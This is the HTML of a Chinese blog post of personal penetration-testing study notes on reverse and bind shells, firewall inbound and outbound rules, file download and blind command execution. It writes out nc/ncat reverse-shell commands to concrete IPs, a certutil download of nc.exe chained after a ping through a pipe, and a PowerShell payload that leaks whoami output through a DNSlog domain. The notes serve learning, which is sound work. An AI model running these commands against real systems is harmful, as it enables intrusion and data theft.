@@ -1,0 +1,271 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>网安入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载 | WH-dragon的荒岛</title><meta name="author" content="WH-dragon"><meta name="copyright" content="WH-dragon"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载 （个人学习笔记）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网安入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载">
+<meta property="og:url" content="http://wh-dragon.github.io/2024/09/28/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%BC%B9%20SHELL&%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%B8%A6%E5%A4%96&%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5&%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E7%AB%99&%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/index.html">
+<meta property="og:site_name" content="WH-dragon的荒岛">
+<meta property="og:description" content="反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载 （个人学习笔记）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://wh-dragon.github.io/img/%E5%A4%B4%E5%83%8F.png">
+<meta property="article:published_time" content="2024-09-27T18:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-27T17:47:23.475Z">
+<meta property="article:author" content="WH-dragon">
+<meta property="article:tag" content="学习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://wh-dragon.github.io/img/%E5%A4%B4%E5%83%8F.png"><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="http://wh-dragon.github.io/2024/09/28/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%BC%B9%20SHELL&amp;%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%B8%A6%E5%A4%96&amp;%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E7%AB%99&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '网安入门-反弹 SHELL&不回显带外&正反向连接&防火墙出入站&文件下载',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-28 01:47:23'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/%E5%A4%B4%E5%83%8F.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/img/%E5%A4%B4%E9%83%A8%E5%9B%BE.png')"><nav id="nav"><span id="blog-info"><a href="/" title="WH-dragon的荒岛"><span class="site-name">WH-dragon的荒岛</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">网安入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-27T18:00:00.000Z" title="发表于 2024-09-28 02:00:00">2024-09-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-27T17:47:23.475Z" title="更新于 2024-09-28 01:47:23">2024-09-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="基础入门-反弹-SHELL-不回显带外-正反向连接-防火墙出入站-文件下载"><a href="#基础入门-反弹-SHELL-不回显带外-正反向连接-防火墙出入站-文件下载" class="headerlink" title="基础入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载"></a>基础入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</h3><p>1、渗透命令-常规命令&amp;文件上传下载</p>
+<p>2、反弹 Shell-防火墙策略&amp;正反向连接</p>
+<p>3、数据回显-查询带外&amp;网络协议层级  </p>
+<h4 id="常规基本渗透命令详解"><a href="#常规基本渗透命令详解" class="headerlink" title="常规基本渗透命令详解"></a>常规基本渗透命令详解</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p>
+<h4 id="实用案例-1：文件上传下载-解决无图形化-解决数据传输"><a href="#实用案例-1：文件上传下载-解决无图形化-解决数据传输" class="headerlink" title="实用案例 1：文件上传下载-解决无图形化&amp;解决数据传输"></a>实用案例 1：文件上传下载-解决无图形化&amp;解决数据传输</h4><p>一种方法<strong>Web浏览器访问</strong>  47.92.236.117&#x2F;nc.exe</p>
+<p>命令生成：<strong>菱角社区</strong>：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a> </p>
+<p>格式： <strong>文件的IP地址 端口 目标文件名 下载后名称</strong></p>
+<p>Linux：wget curl python ruby perl java 等</p>
+<p>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等</p>
+<p>资源管理器（C盘D盘想要下载在哪）的地址栏中输入cmd(删除原来的)并按 Enter</p>
+<p>快捷键打开在切换也可以</p>
+<p>图形化通常指的是图形用户界面（GUI），它是一种允许用户通过视觉元素（如图</p>
+<p>标、窗口和菜单）与计算机程序交互的用户界面。相对于命令行界面（CLI），图形化</p>
+<p>的特点是直观、易用，用户不需要记忆复杂的命令，而是通过鼠标点击和键盘操作来</p>
+<p>完成各种任务。</p>
+<h4 id="实用案例-2：反弹-Shell-命令-解决数据回显-解决数据通讯"><a href="#实用案例-2：反弹-Shell-命令-解决数据回显-解决数据通讯" class="headerlink" title="实用案例 2：反弹 Shell 命令-解决数据回显&amp;解决数据通讯"></a>实用案例 2：反弹 Shell 命令-解决数据回显&amp;解决数据通讯</h4><p>“反弹”（Reverse Shell）是一种攻击技术，它允许攻击者从一个非信任网络中的计算</p>
+<p>机控制另一个计算机。这通常发生在目标计算机位于防火墙或NAT（网络地址转换）</p>
+<p>之后，直接连接到该计算机是不可行的情况下。</p>
+<p>命令生成：<a target="_blank" rel="noopener" href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p>
+<p>正向反向取决于参照物，谁放权谁监听</p>
+<p>1、<strong>正向连接：本地监听等待对方连接</strong></p>
+<p><strong>nc ：Linux自带 windows则需自行下载</strong></p>
+<p> <strong>Linux 控制 Windows</strong> </p>
+<p><strong>&#x2F;&#x2F;Windows绑定 CMD 到本地 5566 端口 (不被占用的端口即可)</strong></p>
+<p><strong>nc -e cmd -lvp 5566</strong></p>
+<p><strong>&#x2F;&#x2F;Linux主动连接目标 5566</strong></p>
+<p><strong>ncat 47.122.23.131 5566      即可控制对方（命令提示符）（Windows的IP地址）</strong></p>
+<p><strong>Windows 控制 Linux</strong></p>
+<p><strong>&#x2F;&#x2F;Linux绑定 SH 到本地 5566 端口</strong></p>
+<p><strong>ncat -e &#x2F;bin&#x2F;sh -lvp 5566</strong></p>
+<p><strong>&#x2F;&#x2F;Windows主动连接目标 5566</strong></p>
+<p><strong>nc 47.94.236.117 5566   (Linux的IP的地址)</strong></p>
+<p>2、<strong>反向连接：主动给出去自己的权限，让对方监听</strong></p>
+<p><strong>Linux让Windows控制</strong> </p>
+<p><strong>&#x2F;&#x2F;Linux绑定 CMD 到目标 5566 端口</strong></p>
+<p><strong>ncat -e &#x2F;bin&#x2F;sh 47.122.23.131 5566  （Windows的IP地址）</strong></p>
+<p><strong>&#x2F; &#x2F;Windows等待 5566 连接</strong></p>
+<p><strong>nc -lvvp 5566</strong></p>
+<p><strong>Windows让Linux控制</strong></p>
+<p><strong>&#x2F;&#x2F;Windows绑定 CMD 到目标 5566 端口</strong></p>
+<p><strong>nc -e cmd 47.94.236.117 5566 （Linux的IP地址）</strong></p>
+<p><strong>&#x2F;&#x2F;Linux等待 5566 连接</strong></p>
+<p><strong>ncat -lvvp 5566</strong></p>
+<p>解决问题：你在外网要控制内网的某一台机器的权限</p>
+<p>正向你只能找到路由器，找不到对应之下的具体某一台机器，只能反向让它找你</p>
+<p>演示理解：</p>
+<p>开一台Windows虚拟机，在其ipconfig得自身内网IP，在游览器输入IP得自身外网IP</p>
+<p>Linux主动监听内网IP，发现连不上，Linux主动监听外网IP，发现也连不上</p>
+<p>只能反向，Windows让Linux控制</p>
+<p>解决问题：你在内网要控制外网的某一台机器的权限</p>
+<p>主动正向连接即可</p>
+<p>两边都内网则需要一个中间人</p>
+<h4 id="实际案例-3：防火墙绕过-正向连接-反向连接-内网服务器"><a href="#实际案例-3：防火墙绕过-正向连接-反向连接-内网服务器" class="headerlink" title="实际案例 3：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器"></a>实际案例 3：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</h4><p>管道符：command1 ？？ command2</p>
+<p>| (管道符号)  :将command1的输出作为command2的输入</p>
+<p>||（逻辑或）如果command1执行失败（返回非零退出状态），则执行command2</p>
+<p>&amp;(后台任务符号) 执行command1，并在后台执行command2，两者互不影响</p>
+<p>&amp;&amp;（逻辑与） 如果command1执行成功（返回零退出状态），则执行command2</p>
+<p>; （命令分隔符）执行command1，然后执行command2，两者顺序执行，不关心前一个命令的执行结果</p>
+<p>&#96;&#96; (反引号)  command：执行command，并将其输出作为其他命令的参数</p>
+<p>Windows-&gt; |  &amp;  ||  &amp;&amp;</p>
+<p>Linux-&gt;; |  ||  &amp;   &amp;&amp; &#96;&#96; (特有’’和;)  </p>
+<p>‘’即为&#96;&#96;,这里markdown不好书写 (Esc键下)</p>
+<p>Linux例子：  </p>
+<p>ping -c 1 127.0.0.1  ;  whoami </p>
+<p>ping -c 1 127.0.0.1 | whoami     whoami不使用标准输入</p>
+<p>ping -c 1 127.0.0.1 ||  whoami</p>
+<p>ping -c 1 127.0.0.1 &amp; whoami</p>
+<p>ping -c 1 127.0.0.1 &amp;&amp; whoami</p>
+<p>ping -c 1 127.0.0.1   ‘whoami’  ping命令不接受命令替换的输出作为参数</p>
+<p><code>whoami</code> 是一个在大多数操作系统中的命令行工具，它的作用是打印当前登录用户的用户名。这个命令通常用于确定当前用户身份，尤其是在脚本中，当需要根据不同的用户执行不同的操作时。返回administrator是Windows的  返回root是Linux</p>
+<p><strong>1，判断出是Windows</strong></p>
+<p><strong>2，Windows没有自带的nc</strong></p>
+<p><strong>3，想办法上传nc 反弹权限</strong> </p>
+<p><strong>ping 127.0.0.1 | certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://47.94.236.117/nc.exe">http://47.94.236.117:80/nc.exe</a> c:\ \ nc.exe</strong></p>
+<p><strong>菱角生成： certutil.exe -urlcache -split -f <a target="_blank" rel="noopener" href="http://47.94.236.117/nc.exe">http://47.94.236.117:80/nc.exe</a> nc.exe</strong> </p>
+<p><strong>管道符和最后的路径需要自己改一下</strong></p>
+<p><strong>4，反弹操作，正反</strong></p>
+<p><strong>正向：</strong></p>
+<p><strong>ping 127.0.0.1 |C:\ \nc.exe -e cmd -lvvp 5566</strong></p>
+<p><strong>ncat 47.122.23.131 5566</strong></p>
+<p><strong>反向：</strong></p>
+<p><strong>ping 127.0.0.1 |C:\ \nc.exe -e cmd 47.94.236.117 5566</strong></p>
+<p><strong>ncat -lvvp 5566  可先</strong></p>
+<p>防火墙有两种规则  她能不能找你还是你找她</p>
+<p><strong>开启入站策略，采用反向连接 （目标防火墙限制5566端口入站）</strong></p>
+<p><strong>Linux: ncat -lvvp 5566</strong></p>
+<p><strong>Windows: 127.0.0.1 | nc -e cmd 47.94.236. 117 5566</strong></p>
+<p><strong>开启出站策略，采用正向连接（一般也不行，防火墙入站严格，出站宽松） （目标防火墙限制5566端口出站）开启5566入站允许后</strong></p>
+<p><strong>Linux: ncat -e cmd 47.122.23.131 5566</strong></p>
+<p><strong>Windows: 127.0.0.1 | nc -e cmd -lvvp 5566</strong></p>
+<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>正反向反弹案例—内网服务器</p>
+<p>只能内网主动交出数据，反向连接</p>
+<h4 id="实际案例-4：防火墙组合数据不回显-ICMP-带外查询-Dnslog"><a href="#实际案例-4：防火墙组合数据不回显-ICMP-带外查询-Dnslog" class="headerlink" title="实际案例 4：防火墙组合数据不回显-ICMP 带外查询 Dnslog"></a>实际案例 4：防火墙组合数据不回显-ICMP 带外查询 Dnslog</h4><p>入站出站都开启策略（数据不回显）：OSI网络七层</p>
+<p>漏洞有，但数据不回显 ping完后没有回显不知道有没有执行</p>
+<p>1，反弹shell</p>
+<p>2，带外查询</p>
+<p>在DNSLog平台 Get SubDomain e24a3l.dnslog.cn</p>
+<p>Linux上 ping e24a3l.dnslog.cn 平台上回显 e24a3l.dnslog.cn </p>
+<p>Linux上 ping whoami.e24a3l.dnslog.cn 平台上回显 whoami.e24a3l.dnslog.cn </p>
+<p>Linux上 ping ‘whoami&#96;e24a3l.dnslog.cn 平台上回显 root.e24a3l.dnslog.cn </p>
+<p>但是Windows不支持这种带外查询，怎么办？</p>
+<p>使用powershell命令(Window7后自带)，怎么玩</p>
+<p>powershell</p>
+<p>$x&#x3D;whoami;$x&#x3D;$x.Replace(‘\ ‘,’xxx’);$y&#x3D;’.e24a3l.dnslog.cn’;$z&#x3D;$x+$y;</p>
+<p>ping $z</p>
+<p>为什么要这样写</p>
+<p>cmd无法执行whoami</p>
+<p>用到powershell变量赋值 把whoami执行结果给变量</p>
+<p>结果带有“\”导致ping无法执行</p>
+<p>皮卡丘：</p>
+<p><strong>ping 127.0.0.1 | powershell $x&#x3D;whoami;$x&#x3D;$x.Replace(‘\ ‘,’xxx’);$y&#x3D;’.e24a3l.dnslog.cn’;$z&#x3D;$x+$y;ping $z</strong></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://WH-dragon.github.io">WH-dragon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://wh-dragon.github.io/2024/09/28/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%BC%B9%20SHELL&amp;%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%B8%A6%E5%A4%96&amp;%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5&amp;%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E7%AB%99&amp;%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">http://wh-dragon.github.io/2024/09/28/入门基础-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://WH-dragon.github.io" target="_blank">WH-dragon的荒岛</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AD%A6%E4%B9%A0/">学习</a></div><div class="post_share"><div class="social-share" data-image="/img/%E5%A4%B4%E5%83%8F.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.png" target="_blank"><img class="post-qr-code-img" src="/img/wechat.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/11/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF&amp;HTTPS/" title="网安入门-抓包技术&amp;HTTPS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">网安入门-抓包技术&amp;HTTPS</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/27/%E5%A4%8D%E6%B4%BB/" title="复活"><img class="cover" src="/img/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">复活</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/09/27/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-Web%E6%9E%B6%E6%9E%84/" title="网安入门-Web架构"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">网安入门-Web架构</div></div></a></div><div><a href="/2024/09/27/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-APP%E4%B8%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%9E%B6%E6%9E%84/" title="网安入门-APP与小程序架构"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-27</div><div class="title">网安入门-APP与小程序架构</div></div></a></div><div><a href="/2024/10/14/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF&%E5%85%B6%E5%AE%83%E5%8D%8F%E8%AE%AE/" title="网安入门-抓包技术&amp;其它协议"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-14</div><div class="title">网安入门-抓包技术&amp;其它协议</div></div></a></div><div><a href="/2024/10/11/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF&HTTPS/" title="网安入门-抓包技术&amp;HTTPS"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-11</div><div class="title">网安入门-抓包技术&amp;HTTPS</div></div></a></div><div><a href="/2024/10/14/%E6%9F%90%E6%AC%A1%E6%AF%94%E8%B5%9B%E8%8D%89%E7%8E%87%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="某次比赛草率的学习笔记"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-14</div><div class="title">某次比赛草率的学习笔记</div></div></a></div><div><a href="/2024/10/16/%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80-%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90&%E4%BC%A0%E8%BE%93%E5%8A%A0%E5%AF%86&%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F&%E5%AF%86%E6%96%87%E5%AD%98%E5%82%A8&%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86&%E9%80%86%E5%90%91%E4%BF%9D%E6%8A%A4/" title="网安入门-算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-16</div><div class="title">网安入门-算法分析&amp;传输加密&amp;数据格式&amp;密文存储&amp;代码混淆&amp;逆向保护</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8F%8D%E5%BC%B9-SHELL-%E4%B8%8D%E5%9B%9E%E6%98%BE%E5%B8%A6%E5%A4%96-%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-%E9%98%B2%E7%81%AB%E5%A2%99%E5%87%BA%E5%85%A5%E7%AB%99-%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text">基础入门-反弹 SHELL&amp;不回显带外&amp;正反向连接&amp;防火墙出入站&amp;文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%9F%BA%E6%9C%AC%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3"><span class="toc-text">常规基本渗透命令详解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B-1%EF%BC%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD-%E8%A7%A3%E5%86%B3%E6%97%A0%E5%9B%BE%E5%BD%A2%E5%8C%96-%E8%A7%A3%E5%86%B3%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93"><span class="toc-text">实用案例 1：文件上传下载-解决无图形化&amp;解决数据传输</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E7%94%A8%E6%A1%88%E4%BE%8B-2%EF%BC%9A%E5%8F%8D%E5%BC%B9-Shell-%E5%91%BD%E4%BB%A4-%E8%A7%A3%E5%86%B3%E6%95%B0%E6%8D%AE%E5%9B%9E%E6%98%BE-%E8%A7%A3%E5%86%B3%E6%95%B0%E6%8D%AE%E9%80%9A%E8%AE%AF"><span class="toc-text">实用案例 2：反弹 Shell 命令-解决数据回显&amp;解决数据通讯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B-3%EF%BC%9A%E9%98%B2%E7%81%AB%E5%A2%99%E7%BB%95%E8%BF%87-%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5-%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5-%E5%86%85%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">实际案例 3：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-text"></span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 